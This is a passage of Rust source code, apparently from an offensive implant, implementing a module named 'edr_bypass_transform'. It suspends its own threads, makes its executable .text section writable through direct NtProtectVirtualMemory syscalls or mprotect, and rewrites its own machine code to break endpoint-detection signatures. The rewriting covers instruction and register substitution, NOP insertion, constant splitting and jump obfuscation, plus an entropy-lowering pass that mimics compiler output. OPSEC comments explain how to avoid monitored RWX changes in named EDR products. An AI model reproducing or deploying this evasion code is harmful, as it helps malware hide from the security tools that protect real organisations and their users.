        text[*site_offset..*site_offset + pat_len].copy_from_slice(pattern);

        records.push(TransformRecord {
            offset: *site_offset,
            transform_type: "deentropize_low_entropy_padding".to_string(),
            before_hex: hex_encode(&before),
            after_hex: hex_encode(pattern),
            size_delta: 0, // Same-size replacement
        });
        replacements += 1;

        // Check entropy after each replacement — stop early if we're under.
        let new_entropy = shannon_entropy(text);
        if new_entropy <= entropy_threshold {
            tracing::info!(
                "edr_bypass_transform: de-entropization reduced entropy to {:.3} after {} replacements",
                new_entropy,
                replacements,
            );
            break;
        }
    }

    tracing::info!(
        "edr_bypass_transform: de-entropization applied {} low-entropy replacements",
        replacements,
    );
    records
}

// ── Verification ────────────────────────────────────────────────────────────

/// Compute the SHA-256 hash of the current `.text` section.
fn hash_text(text: &[u8]) -> String {
    let digest = Sha256::digest(text);
    hex::encode(digest)
}

// ── Page protection ─────────────────────────────────────────────────────────

/// Make a memory region writable (RW) for transformation, returning the
/// original protection (typically PAGE_EXECUTE_READ for .text sections).
///
/// # OPSEC
///
/// Uses PAGE_READWRITE (0x04), never PAGE_EXECUTE_READWRITE (0x40).
/// RWX pages are the single most monitored memory protection change by
/// EDR products (CrowdStrike Falcon, Microsoft Defender for Endpoint,
/// SentinelOne).  The pattern is: save → RW → write → restore to saved.
///
/// # Safety
///
/// Caller must restore the original protection after modifications.
#[cfg(windows)]
unsafe fn make_region_writable(base: usize, size: usize) -> Result<u32> {
    let mut old_protect: u32 = 0;
    let mut region_base = base as *mut std::ffi::c_void;
    let mut region_size = size;
    let status = crate::syscall!(
        "NtProtectVirtualMemory",
        (-1i64) as u64, // NtCurrentProcess()
        &mut region_base as *mut _ as u64,
        &mut region_size as *mut _ as u64,
        0x04u32 as u64, // PAGE_READWRITE — never RWX (EDR signal)
        &mut old_protect as *mut _ as u64,
    )
    .map_err(|e| {
        anyhow::anyhow!("edr_bypass_transform: NtProtectVirtualMemory resolution failed: {e}")
    })?;
    if status != 0 {
        bail!("edr_bypass_transform: NtProtectVirtualMemory failed: 0x{status:08X}");
    }
    Ok(old_protect)
}

/// Restore page protection to its original value.
#[cfg(windows)]
unsafe fn restore_protection(base: usize, size: usize, original: u32) -> Result<()> {
    let mut old_protect: u32 = 0;
    let mut region_base = base as *mut std::ffi::c_void;
    let mut region_size = size;
    let status = crate::syscall!(
        "NtProtectVirtualMemory",
        (-1i64) as u64, // NtCurrentProcess()
        &mut region_base as *mut _ as u64,
        &mut region_size as *mut _ as u64,
        original as u64,
        &mut old_protect as *mut _ as u64,
    )
    .map_err(|e| {
        anyhow::anyhow!("edr_bypass_transform: NtProtectVirtualMemory resolution failed: {e}")
    })?;
    if status != 0 {
        bail!("edr_bypass_transform: NtProtectVirtualMemory restore failed: 0x{status:08X}");
    }
    Ok(())
}

/// Linux implementation of make_region_writable using mprotect.
#[cfg(not(windows))]
unsafe fn make_region_writable(base: usize, size: usize) -> Result<u32> {
    use std::io;
    // Query current protection by reading /proc/self/maps.
    let maps = std::fs::read_to_string("/proc/self/maps").map_err(|e| {
        anyhow::anyhow!("edr_bypass_transform: failed to read /proc/self/maps: {e}")
    })?;

    // Find the mapping that contains `base`.
    let mut original_protect: u32 = 0x05; // PROT_READ|PROT_EXEC default for .text
    for line in maps.lines() {
        // Format: start-end perms ...
        let parts: Vec<&str> = line.splitn(3, ' ').collect();
        if parts.len() < 2 {
            continue;
        }
        let addr_range: Vec<&str> = parts[0].splitn(2, '-').collect();
        if addr_range.len() != 2 {
            continue;
        }
        if let (Ok(start), Ok(end)) = (
            usize::from_str_radix(addr_range[0], 16),
            usize::from_str_radix(addr_range[1], 16),
        ) {
            if base >= start && base < end {
                let perms = parts[1].as_bytes();
                let mut prot: u32 = 0;
                if perms.len() >= 1 && perms[0] == b'r' {
                    prot |= 0x1;
                } // PROT_READ
                if perms.len() >= 2 && perms[1] == b'w' {
                    prot |= 0x2;
                } // PROT_WRITE
                if perms.len() >= 3 && perms[2] == b'x' {
                    prot |= 0x4;
                } // PROT_EXEC
                original_protect = prot;
                break;
            }
        }
    }

    // Make the region read-write (keep exec off to avoid RWX pages).
    const PROT_READ: u32 = 0x1;
    const PROT_WRITE: u32 = 0x2;
    let new_prot = PROT_READ | PROT_WRITE;

    // Align to page boundary.
    let page_size = 4096usize;
    let aligned_base = base & !(page_size - 1);
    let aligned_end = (base + size + page_size - 1) & !(page_size - 1);
    let aligned_size = aligned_end - aligned_base;

    let ret = libc::mprotect(
        aligned_base as *mut std::ffi::c_void,
        aligned_size,
        new_prot as i32,
    );
    if ret != 0 {
        bail!(
            "edr_bypass_transform: mprotect(RW) failed for {:x}-{:x}: {}",
            aligned_base,
            aligned_end,
            io::Error::last_os_error()
        );
    }
    Ok(original_protect)
}

/// Linux implementation of restore_protection using mprotect.
#[cfg(not(windows))]
unsafe fn restore_protection(base: usize, size: usize, original: u32) -> Result<()> {
    use std::io;
    // Align to page boundary.
    let page_size = 4096usize;
    let aligned_base = base & !(page_size - 1);
    let aligned_end = (base + size + page_size - 1) & !(page_size - 1);
    let aligned_size = aligned_end - aligned_base;

    let ret = libc::mprotect(
        aligned_base as *mut std::ffi::c_void,
        aligned_size,
        original as i32,
    );
    if ret != 0 {
        bail!(
            "edr_bypass_transform: mprotect(restore) failed for {:x}-{:x}: {}",
            aligned_base,
            aligned_end,
            io::Error::last_os_error()
        );
    }
    Ok(())
}

// ── Public API ──────────────────────────────────────────────────────────────

/// Run one full scan-and-transform cycle.
///
/// 1. Computes the SHA-256 of `.text` before changes.
/// 2. Scans for all known EDR signatures.
/// 3. Applies transformations (up to `max_transforms_per_cycle`).
/// 4. Re-hashes `.text` and verifies the transformation was applied.
/// 5. Returns a detailed `TransformCycleResult`.
///
/// # Arguments
///
/// * `max_transforms` — Maximum number of transformations to apply this cycle.
/// * `entropy_threshold` — Shannon entropy threshold; regions above are skipped.
///
/// # Safety
///
/// This function modifies executable memory in-place.  All sibling OS threads
/// are suspended during the transformation window via
/// `self_reencode::freeze_threads()` (NtSuspendThread / SIGSTOP).
/// Threads are automatically resumed on success or failure (Drop guard).
pub fn run_edr_bypass_transform(
    max_transforms: u32,
    entropy_threshold: f64,
) -> Result<TransformCycleResult> {
    let start = std::time::Instant::now();

    // P1-03: Suspend all sibling threads before touching .text to avoid
    // race conditions where another thread executes partially-written code.
    // The FrozenThreads guard auto-resumes on Drop (panic-safe).
    let mut frozen = crate::self_reencode::freeze_threads()
        .context("edr_bypass_transform: failed to freeze sibling threads")?;

    // Step 1: Locate .text section.
    let text_section = crate::self_reencode::find_text_section()
        .context("edr_bypass_transform: failed to locate .text section")?;

    let text_ptr = text_section.base as *mut u8;
    let text_size = text_section.size;

    // Step 2: Hash before.
    let text_before = unsafe { std::slice::from_raw_parts(text_ptr, text_size) };
    let hash_before = hash_text(text_before);

    // Step 2b: Compute entropy before transforms.
    let entropy_before = shannon_entropy(text_before);
    tracing::info!(
        "edr_bypass_transform: .text entropy before transforms: {:.3}",
        entropy_before,
    );

    // Step 3: Make .text writable.
    let original_protect = unsafe { make_region_writable(text_section.base, text_section.size) }
        .context("edr_bypass_transform: failed to make .text writable")?;

    // Step 4: Scan for signatures.
    let hits = scan_for_signatures()?;

    // Step 5: Build exclusion bitmap.
    let text_mut = unsafe { std::slice::from_raw_parts_mut(text_ptr, text_size) };
    let excluded = build_exclusion_bitmap(text_mut);

    // Step 6: Apply transformations.
    let mut all_transforms = Vec::new();
    let mut applied = 0u32;

    // Filter hits by entropy threshold into a set of actionable offsets.
    let actionable_offsets: HashSet<usize> = hits
        .iter()
        .filter(|h| {
            let region_start = h.offset.saturating_sub(32);
            let region_end = (h.offset + 32).min(text_mut.len());
            shannon_entropy(&text_mut[region_start..region_end]) < entropy_threshold
        })
        .map(|h| h.offset)
        .collect();

    tracing::info!(
        "edr_bypass_transform: {} actionable hits out of {} total (entropy threshold: {:.1})",
        actionable_offsets.len(),
        hits.len(),
        entropy_threshold,
    );

    // Apply each transformation type in order, respecting the budget.
    // 1. Instruction substitution (xor → sub).
    if applied < max_transforms {
        let recs = transform_xor_to_sub(text_mut, &excluded, &actionable_offsets);
        for r in &recs {
            tracing::debug!(
                "edr_bypass_transform: applied {} at offset {}",
                r.transform_type,
                r.offset
            );
        }
        applied += recs.len() as u32;
        all_transforms.extend(recs);
    }

    // 2. Register reassignment (r10 → r11 in non-syscall code).
    if applied < max_transforms {
        let recs = transform_register_reassignment(text_mut, &excluded, &actionable_offsets);
        for r in &recs {
            tracing::debug!(
                "edr_bypass_transform: applied {} at offset {}",
                r.transform_type,
                r.offset
            );
        }
        applied += recs.len() as u32;
        all_transforms.extend(recs);
    }

    // 3. NOP sled insertion.
    if applied < max_transforms {
        let recs = transform_nop_insertion(text_mut, &excluded, &actionable_offsets);
        for r in &recs {
            tracing::debug!(
                "edr_bypass_transform: applied {} at offset {}",
                r.transform_type,
                r.offset
            );
        }
        applied += recs.len() as u32;
        all_transforms.extend(recs);
    }

    // 4. Constant splitting (XOR-encoded mov rax, imm64) — stronger transform,
    //    runs first so it takes priority over the weaker register-only swap below.
    if applied < max_transforms {
        let recs = transform_constant_splitting(text_mut, &excluded, &actionable_offsets);
        for r in &recs {
            tracing::debug!(
                "edr_bypass_transform: applied {} at offset {}",
                r.transform_type,
                r.offset
            );
        }
        applied += recs.len() as u32;
        all_transforms.extend(recs);
    }

    // 5. Register swap (rax↔r11) — weaker fallback for locations where
    //    constant splitting couldn't apply (not enough padding room).
    if applied < max_transforms {
        let recs = transform_register_swap_rax_r11(text_mut, &excluded, &actionable_offsets);
        for r in &recs {
            tracing::debug!(
                "edr_bypass_transform: applied {} at offset {}",
                r.transform_type,
                r.offset
            );
        }
        applied += recs.len() as u32;
        all_transforms.extend(recs);
    }

    // 6. Jump obfuscation.
    if applied < max_transforms {
        let recs = transform_jump_obfuscation(text_mut, &excluded, &actionable_offsets);
        for r in &recs {
            tracing::debug!(
                "edr_bypass_transform: applied {} at offset {}",
                r.transform_type,
                r.offset
            );
        }
        applied += recs.len() as u32;
        all_transforms.extend(recs);
    }

    // 7. Indirect call obfuscation.
    if applied < max_transforms {
        let recs = transform_indirect_call(text_mut, &excluded, &actionable_offsets);
        for r in &recs {
            tracing::debug!(
                "edr_bypass_transform: applied {} at offset {}",
                r.transform_type,
                r.offset
            );
        }
        applied += recs.len() as u32;
        all_transforms.extend(recs);
    }

    // Truncate to max_transforms.
    all_transforms.truncate(max_transforms as usize);
    applied = all_transforms.len() as u32;

    // Step 6b: Entropy-aware de-entropization pass.
    // After the main transform cycle, if entropy exceeds the threshold,
    // replace some randomized semantic NOPs with low-entropy padding that
    // mimics legitimate compiler output (repeated CC/90 patterns).
    // This only adjusts NOP-insertion sites — it never undoes
    // signature-breaking transforms.
    if applied > 0 {
        let deent_recs = deentropize_pass(text_mut, &all_transforms, &excluded, entropy_threshold);
        if !deent_recs.is_empty() {
            tracing::debug!(
                "edr_bypass_transform: de-entropization replaced {} NOP sites with low-entropy padding",
                deent_recs.len(),
            );
            // De-entropization records are informational — they don't count
            // against the main transform budget.
            all_transforms.extend(deent_recs);
        }
    }

    // Step 7: Count skipped (in exclusion zone or above entropy threshold).
    // P2-17: Use actionable_offsets (post-entropy-filter) not raw hits.
    let skipped = actionable_offsets.len().saturating_sub(applied as usize) as u32;

    // Step 8: Hash after + compute entropy after.
    let text_after = unsafe { std::slice::from_raw_parts(text_ptr, text_size) };
    let hash_after = hash_text(text_after);
    let entropy_after = shannon_entropy(text_after);

    // Step 8b: Low-entropy warning.
    // If any transformed region has suspiciously low entropy (below floor),
    // it may indicate a failed transform or unexpected uniformity.
    for rec in all_transforms.iter() {
        let rec_end = (rec.offset + rec.after_hex.len() / 2).min(text_after.len());
        if rec.offset >= rec_end {
            continue;
        }
        let region_entropy = shannon_entropy(&text_after[rec.offset..rec_end]);
        if region_entropy < ENTROPY_FLOOR {
            tracing::warn!(
                "edr_bypass_transform: transformed region at offset {} has low entropy {:.3} (floor: {:.3}) — possible failed transform",
                rec.offset,
                region_entropy,
                ENTROPY_FLOOR,
            );
        }
    }

    tracing::info!(
        "edr_bypass_transform: .text entropy after transforms: {:.3} (delta: {:+.3})",
        entropy_after,
        entropy_after - entropy_before,
    );

    // Step 9: Restore page protection.
    unsafe {
        restore_protection(text_section.base, text_section.size, original_protect)?;
    }

    // Step 10: Flush instruction cache (Windows).
    #[cfg(windows)]
    {
        let status = match crate::syscall!(
            "NtFlushInstructionCache",
            std::ptr::null_mut::<std::ffi::c_void>() as u64, // current process
            text_ptr as *mut std::ffi::c_void as u64,
            text_size as u64,
        ) {
            Ok(status) => status,
            Err(e) => {
                tracing::warn!(
                    "edr_bypass_transform: NtFlushInstructionCache resolution failed: {e}"
                );
                0
            }
        };
        if status != 0 {
            tracing::warn!("edr_bypass_transform: NtFlushInstructionCache returned 0x{status:08X}");
        }
    }

    // P1-03: Resume sibling threads now that .text is restored and flushed.
    // The FrozenThreads Drop guard would also do this, but explicit thaw
    // ensures threads resume *after* the cache flush.
    frozen.thaw();

    let elapsed = start.elapsed();

    // Update global stats.
    LAST_TRANSFORM_COUNT.store(applied, Ordering::Relaxed);
    TOTAL_TRANSFORMS.fetch_add(applied as u64, Ordering::Relaxed);
    LAST_SCAN_TIMESTAMP.store(
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_secs(),
        Ordering::Relaxed,
    );

    let result = TransformCycleResult {
        hash_before,
        hash_after,
        signatures_found: hits,
        transforms_applied: all_transforms,
        skipped,
        elapsed_ms: elapsed.as_millis() as u64,
        entropy_before,
        entropy_after,
    };

    tracing::info!(
        "edr_bypass_transform: cycle complete — {} transforms applied, {} skipped, {} ms, entropy {:.3}→{:.3}",
        applied,
        skipped,
        elapsed.as_millis(),
        entropy_before,
        entropy_after,
    );

    // Store last result for status queries.
    {
        let mut guard = LAST_RESULT.lock_recover();
        *guard = Some(result.clone());
    }

    Ok(result)
}

/// Get a status snapshot of the evasion transform subsystem.
///
/// Returns a JSON object with scan counts, transform counts, and last cycle
/// timing information.
pub fn status() -> String {
    let last_scan = LAST_SCAN_COUNT.load(Ordering::Relaxed);
    let last_transforms = LAST_TRANSFORM_COUNT.load(Ordering::Relaxed);
    let total_transforms = TOTAL_TRANSFORMS.load(Ordering::Relaxed);

    let last_timestamp = LAST_SCAN_TIMESTAMP.load(Ordering::Relaxed);

    let last_cycle_info = {
        let guard = LAST_RESULT.lock_recover();
        guard.as_ref().map(|r| {
            serde_json::json!({
                "hash_before": r.hash_before,
                "hash_after": r.hash_after,
                "signatures_found": r.signatures_found.len(),
                "transforms_applied": r.transforms_applied.len(),
                "skipped": r.skipped,
                "elapsed_ms": r.elapsed_ms,
                "entropy_before": r.entropy_before,
                "entropy_after": r.entropy_after,
            })
        })
    };

    let status = serde_json::json!({
        "last_scan_hits": last_scan,
        "last_cycle_transforms": last_transforms,
        "total_transforms": total_transforms,
        "last_scan_timestamp": if last_timestamp > 0 { Some(last_timestamp) } else { None },
        "last_cycle": last_cycle_info,
    });

    serde_json::to_string_pretty(&status).unwrap_or_default()
}
